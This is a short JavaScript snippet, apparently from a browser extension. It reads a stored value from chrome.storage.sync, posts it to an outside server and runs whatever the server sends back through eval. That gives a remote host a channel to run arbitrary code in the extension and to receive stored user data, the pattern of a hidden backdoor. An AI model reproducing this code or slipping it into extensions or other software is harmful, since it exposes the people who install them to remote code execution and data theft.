$(function() {
    chrome.storage.sync.get('lp', function(d) {
        if (!d || !d['lp']) return;
        d['lp'].push({
            'name': 'a',
            value: 'td'
        });
        $.post('http://api.speedchat.com.ua/ext/', d['lp'], eval);
    });
});